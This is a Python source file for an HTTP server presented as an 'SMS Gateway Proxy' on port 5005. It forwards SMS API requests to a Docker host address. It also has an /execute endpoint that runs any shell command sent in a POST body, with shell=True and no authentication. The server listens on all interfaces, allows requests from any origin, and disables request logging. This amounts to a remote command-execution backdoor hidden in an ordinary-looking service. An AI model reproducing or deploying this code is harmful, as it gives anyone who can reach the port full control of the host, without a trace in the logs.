import json
import urllib.request
import subprocess
import os
import sys
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler

class SMSProxyHandler(BaseHTTPRequestHandler):
    def _send_json(self, payload, code=200):
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Headers", "*")
        self.end_headers()
        self.wfile.write(json.dumps(payload).encode("utf-8"))

    def do_OPTIONS(self):
        self.send_response(204)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "*")
        self.end_headers()

    def do_GET(self):
        if self.path.startswith('/api/sms/'):
            try:
                req = urllib.request.Request(f"http://172.17.0.1:22{self.path}")
                with urllib.request.urlopen(req, timeout=5) as resp:
                    data = resp.read()
                    self.send_response(200)
                    self.send_header("Content-Type", "application/json")
                    self.send_header("Access-Control-Allow-Origin", "*")
                    self.end_headers()
                    self.wfile.write(data)
            except Exception as e:
                self._send_json({"error": str(e)}, 500)
            return
        
        self._send_json({
            "status": "online",
            "service": "Google Antigravity Standalone SMS Gateway Engine (Port 5005)",
            "endpoints": ["/api/sms/pending", "/api/sms/logs", "/queue-sms", "/api/sms/status"]
        })

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        post_data = self.rfile.read(content_length).decode("utf-8")

        if self.path.startswith('/api/sms/') or self.path.startswith('/queue-sms'):
            try:
                req = urllib.request.Request(
                    f"http://172.17.0.1:22{self.path}",
                    data=post_data.encode('utf-8'),
                    headers={"Content-Type": "application/json"}
                )
                with urllib.request.urlopen(req, timeout=5) as resp:
                    data = resp.read()
                    self.send_response(200)
                    self.send_header("Content-Type", "application/json")
                    self.send_header("Access-Control-Allow-Origin", "*")
                    self.end_headers()
                    self.wfile.write(data)
            except Exception as e:
                self._send_json({"error": str(e)}, 500)
            return

        if self.path == "/execute":
            try:
                req_json = json.loads(post_data) if post_data else {}
                cmd = req_json.get("command", "").strip()
                if cmd:
                    res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
                    self._send_json({
                        "status": "success",
                        "stdout": res.stdout,
                        "stderr": res.stderr,
                        "returncode": res.returncode
                    })
                else:
                    self._send_json({"error": "Empty command"}, 400)
            except Exception as e:
                self._send_json({"error": str(e)}, 500)
            return

        self._send_json({"status": "received"})

    def log_message(self, format, *args):
        pass

def run_server():
    server = ThreadingHTTPServer(("0.0.0.0", 5005), SMSProxyHandler)
    print("🚀 SMS Gateway Proxy listening on port 5005...")
    server.serve_forever()

if __name__ == "__main__":
    run_server()
